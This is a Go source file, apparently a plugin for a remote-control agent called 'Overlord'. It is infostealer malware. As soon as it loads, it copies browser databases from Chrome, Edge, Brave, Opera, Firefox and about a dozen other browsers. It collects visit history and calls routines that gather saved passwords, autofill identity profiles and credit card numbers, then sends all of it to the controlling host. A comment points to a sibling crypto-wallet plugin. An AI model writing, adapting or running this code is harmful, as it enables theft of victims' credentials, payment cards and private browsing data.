package main

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"
)

// HostInfo is sent by the Overlord agent on load.
type HostInfo struct {
	ClientID string `json:"clientId"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Version  string `json:"version"`
}

// HistoryEntry represents one URL visit.
type HistoryEntry struct {
	URL    string `json:"url"`
	Title  string `json:"title"`
	Source string `json:"source"` // e.g. "Chrome", "Firefox (Profile1)"
}

// PasswordEntry represents one saved login credential.
type PasswordEntry struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
	Source   string `json:"source"`
}

// AutofillProfile represents a saved address/identity profile.
type AutofillProfile struct {
	FullName string `json:"fullName"`
	Email    string `json:"email"`
	Phone    string `json:"phone"`
	Address  string `json:"address"`
	City     string `json:"city"`
	State    string `json:"state"`
	Zip      string `json:"zip"`
	Country  string `json:"country"`
	Source   string `json:"source"`
}

// CreditCard represents a saved credit card.
type CreditCard struct {
	NameOnCard string `json:"nameOnCard"`
	Number     string `json:"number"`
	ExpMonth   string `json:"expMonth"`
	ExpYear    string `json:"expYear"`
	Source     string `json:"source"`
}

// ScanResult is the payload of the "history_result" event.
type ScanResult struct {
	Entries       []HistoryEntry  `json:"entries"`
	Total         int             `json:"total"`
	Passwords     []PasswordEntry `json:"passwords"`
	PasswordTotal int             `json:"passwordTotal"`
	Profiles      []AutofillProfile `json:"profiles"`
	ProfileTotal  int               `json:"profileTotal"`
	Cards         []CreditCard      `json:"cards"`
	CardTotal     int               `json:"cardTotal"`
	ScannedAt     string          `json:"scannedAt"`
	Errors        []string        `json:"errors,omitempty"`
}

var (
	hostInfo HostInfo
	sendFn   func(event string, payload []byte)
	mu       sync.Mutex
)

func setSend(fn func(event string, payload []byte)) {
	mu.Lock()
	sendFn = fn
	mu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	mu.Lock()
	fn := sendFn
	mu.Unlock()
	if fn == nil {
		return
	}
	data, err := json.Marshal(payload)
	if err != nil {
		return
	}
	fn(event, data)
}

func handleInit(hostJSON []byte) error {
	if err := json.Unmarshal(hostJSON, &hostInfo); err != nil {
		return err
	}
	sendEvent("ready", map[string]string{"message": "browser-history plugin ready"})
	go func() {
		result := performScan()
		sendEvent("history_result", result)
	}()
	return nil
}

func handleEvent(event string, payload []byte) error {
	if event == "scan" {
		go func() {
			result := performScan()
			sendEvent("history_result", result)
		}()
	}
	return nil
}

func handleUnload() {
	// Nil out the send function so any still-running goroutines don't attempt
	// to invoke the host callback after the DLL is freed.
	setSend(nil)
}

// ── env helpers ─────────────────────────────────────────────────────────────

type envPaths struct {
	AppData      string
	LocalAppData string
	UserProfile  string
}

func getEnvPaths() envPaths {
	home, _ := os.UserHomeDir()
	appdata := os.Getenv("APPDATA")
	localappdata := os.Getenv("LOCALAPPDATA")
	userprofile := os.Getenv("USERPROFILE")
	if appdata == "" {
		appdata = filepath.Join(home, "AppData", "Roaming")
	}
	if localappdata == "" {
		localappdata = filepath.Join(home, "AppData", "Local")
	}
	if userprofile == "" {
		userprofile = home
	}
	return envPaths{AppData: appdata, LocalAppData: localappdata, UserProfile: userprofile}
}

func expandPath(p string, env envPaths) string {
	p = strings.ReplaceAll(p, "%APPDATA%", env.AppData)
	p = strings.ReplaceAll(p, "%LOCALAPPDATA%", env.LocalAppData)
	p = strings.ReplaceAll(p, "%USERPROFILE%", env.UserProfile)
	return p
}

// ── file helpers ─────────────────────────────────────────────────────────────

// copyFile copies src to dst, preserving read access on locked files.
// On Windows, os.Open uses FILE_SHARE_READ|FILE_SHARE_WRITE which allows
// reading SQLite files that are open by the browser.
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

// tempCopy copies src to a temp file and returns its path.
// The caller is responsible for deleting the temp file.
func tempCopy(src string) (string, error) {
	ext := filepath.Ext(src)
	tmp, err := os.CreateTemp("", "bh_*"+ext)
	if err != nil {
		return "", err
	}
	tmp.Close()
	if err := copyFile(src, tmp.Name()); err != nil {
		os.Remove(tmp.Name())
		return "", err
	}
	return tmp.Name(), nil
}

// ── chromium browsers ────────────────────────────────────────────────────────

type chromiumBrowser struct {
	name        string
	userDataDir string // path with %APPDATA% / %LOCALAPPDATA% placeholders
}

// Same browser list as the crypto-wallet plugin.
var chromiumBrowserDefs = []chromiumBrowser{
	{"Google Chrome", `%LOCALAPPDATA%\Google\Chrome\User Data`},
	{"Brave", `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data`},
	{"Microsoft Edge", `%LOCALAPPDATA%\Microsoft\Edge\User Data`},
	{"Opera GX", `%APPDATA%\Opera Software\Opera GX Stable`},
	{"Opera", `%APPDATA%\Opera Software\Opera Stable`},
	{"Vivaldi", `%LOCALAPPDATA%\Vivaldi\User Data`},
	{"Chromium", `%LOCALAPPDATA%\Chromium\User Data`},
	{"Yandex Browser", `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data`},
	{"Epic Privacy Browser", `%LOCALAPPDATA%\Epic Privacy Browser\User Data`},
	{"Comodo Dragon", `%LOCALAPPDATA%\Comodo\Dragon\User Data`},
	{"Torch Browser", `%LOCALAPPDATA%\Torch\User Data`},
	{"Cent Browser", `%LOCALAPPDATA%\CentBrowser\User Data`},
	{"Chedot Browser", `%LOCALAPPDATA%\Chedot\User Data`},
	{"Slimjet", `%LOCALAPPDATA%\Slimjet\User Data`},
	{"uCozMedia Uran", `%LOCALAPPDATA%\uCozMedia\Uran\User Data`},
	{"Orbitum", `%LOCALAPPDATA%\Orbitum\User Data`},
	{"Amigo", `%LOCALAPPDATA%\Amigo\User Data`},
	{"Sputnik", `%LOCALAPPDATA%\Sputnik\Sputnik\User Data`},
}

func resolvedChromiumBrowsers(env envPaths) []chromiumBrowser {
	out := make([]chromiumBrowser, len(chromiumBrowserDefs))
	for i, b := range chromiumBrowserDefs {
		out[i] = chromiumBrowser{name: b.name, userDataDir: expandPath(b.userDataDir, env)}
	}
	return out
}

// profilesInUserData returns profile directory names — matches crypto-wallet logic.
func profilesInUserData(userDataDir string) []string {
	var profiles []string
	if _, err := os.Stat(filepath.Join(userDataDir, "Default")); err == nil {
		profiles = append(profiles, "Default")
	}
	for i := 1; i <= 30; i++ {
		name := fmt.Sprintf("Profile %d", i)
		if _, err := os.Stat(filepath.Join(userDataDir, name)); err == nil {
			profiles = append(profiles, name)
		}
	}
	return profiles
}

func readChromiumHistory(b chromiumBrowser, profile string) ([]HistoryEntry, error) {
	dbPath := filepath.Join(b.userDataDir, profile, "History")
	if _, err := os.Stat(dbPath); err != nil {
		return nil, fmt.Errorf("not found: %s", dbPath)
	}
	tmp, err := tempCopy(dbPath)
	if err != nil {
		return nil, fmt.Errorf("copy failed: %w", err)
	}
	defer os.Remove(tmp)

	db, err := newSQLiteReader(tmp)
	if err != nil {
		return nil, fmt.Errorf("open sqlite: %w", err)
	}

	rows, err := db.ReadTable("urls")
	if err != nil {
		return nil, fmt.Errorf("read urls table: %w", err)
	}

	source := b.name
	if profile != "Default" {
		source = fmt.Sprintf("%s (%s)", b.name, profile)
	}

	var entries []HistoryEntry
	seen := make(map[string]bool)
	for _, row := range rows {
		// urls table: id, url, title, visit_count, typed_count, last_visit_time, hidden
		if len(row) < 3 {
			continue
		}
		url, _ := row[1].(string)
		title, _ := row[2].(string)
		if url == "" || seen[url] {
			continue
		}
		seen[url] = true
		entries = append(entries, HistoryEntry{URL: url, Title: title, Source: source})
	}
	return entries, nil
}

// ── Firefox ──────────────────────────────────────────────────────────────────

func firefoxProfiles(env envPaths) []string {
	base := expandPath(`%APPDATA%\Mozilla\Firefox\Profiles`, env)
	entries, err := os.ReadDir(base)
	if err != nil {
		return nil
	}
	var dirs []string
	for _, e := range entries {
		if e.IsDir() {
			dirs = append(dirs, filepath.Join(base, e.Name()))
		}
	}
	return dirs
}

func readFirefoxHistory(profileDir string) ([]HistoryEntry, error) {
	dbPath := filepath.Join(profileDir, "places.sqlite")
	if _, err := os.Stat(dbPath); err != nil {
		return nil, fmt.Errorf("not found: %s", dbPath)
	}
	tmp, err := tempCopy(dbPath)
	if err != nil {
		return nil, fmt.Errorf("copy failed: %w", err)
	}
	defer os.Remove(tmp)

	db, err := newSQLiteReader(tmp)
	if err != nil {
		return nil, fmt.Errorf("open sqlite: %w", err)
	}

	rows, err := db.ReadTable("moz_places")
	if err != nil {
		return nil, fmt.Errorf("read moz_places: %w", err)
	}

	profileName := filepath.Base(profileDir)
	// Strip the random UUID prefix (e.g. "xxxxxxxx.default-release" → "default-release")
	if idx := strings.IndexByte(profileName, '.'); idx >= 0 {
		profileName = profileName[idx+1:]
	}
	source := fmt.Sprintf("Firefox (%s)", profileName)

	var entries []HistoryEntry
	seen := make(map[string]bool)
	for _, row := range rows {
		// moz_places: id, url, title, rev_host, visit_count, ...
		if len(row) < 3 {
			continue
		}
		url, _ := row[1].(string)
		title, _ := row[2].(string)
		if url == "" || seen[url] {
			continue
		}
		// Skip internal Firefox URLs
		if strings.HasPrefix(url, "place:") || strings.HasPrefix(url, "about:") {
			continue
		}
		seen[url] = true
		entries = append(entries, HistoryEntry{URL: url, Title: title, Source: source})
	}
	return entries, nil
}

// ── main scan ────────────────────────────────────────────────────────────────

func performScan() ScanResult {
	env := getEnvPaths()
	var (
		allEntries []HistoryEntry
		errors     []string
	)
	globalSeen := make(map[string]bool)

	addEntries := func(entries []HistoryEntry, err error, label string) {
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", label, err))
			return
		}
		for _, e := range entries {
			if globalSeen[e.URL] {
				continue
			}
			globalSeen[e.URL] = true
			allEntries = append(allEntries, e)
		}
	}

	// Chromium-based browsers
	for _, b := range resolvedChromiumBrowsers(env) {
		if _, err := os.Stat(b.userDataDir); err != nil {
			continue
		}
		profiles := profilesInUserData(b.userDataDir)
		for _, profile := range profiles {
			entries, err := readChromiumHistory(b, profile)
			addEntries(entries, err, fmt.Sprintf("%s/%s", b.name, profile))
		}
	}

	// Firefox
	for _, profileDir := range firefoxProfiles(env) {
		name := filepath.Base(profileDir)
		entries, err := readFirefoxHistory(profileDir)
		addEntries(entries, err, "Firefox/"+name)
	}

	// Sort alphabetically by domain (strip protocol + www.), then by full URL.
	domainKey := func(rawURL string) string {
		s := rawURL
		if i := strings.Index(s, "://"); i >= 0 {
			s = s[i+3:]
		}
		s = strings.TrimPrefix(s, "www.")
		return strings.ToLower(s)
	}
	sort.Slice(allEntries, func(i, j int) bool {
		return domainKey(allEntries[i].URL) < domainKey(allEntries[j].URL)
	})

	// Passwords
	passwords, pwdErrors := scanAllPasswords(env)
	errors = append(errors, pwdErrors...)

	// Autofill
	profiles, cards, afErrors := scanAllAutofill(env)
	errors = append(errors, afErrors...)

	return ScanResult{
		Entries:       allEntries,
		Total:         len(allEntries),
		Passwords:     passwords,
		PasswordTotal: len(passwords),
		Profiles:      profiles,
		ProfileTotal:  len(profiles),
		Cards:         cards,
		CardTotal:     len(cards),
		ScannedAt:     time.Now().UTC().Format(time.RFC3339),
		Errors:        errors,
	}
}
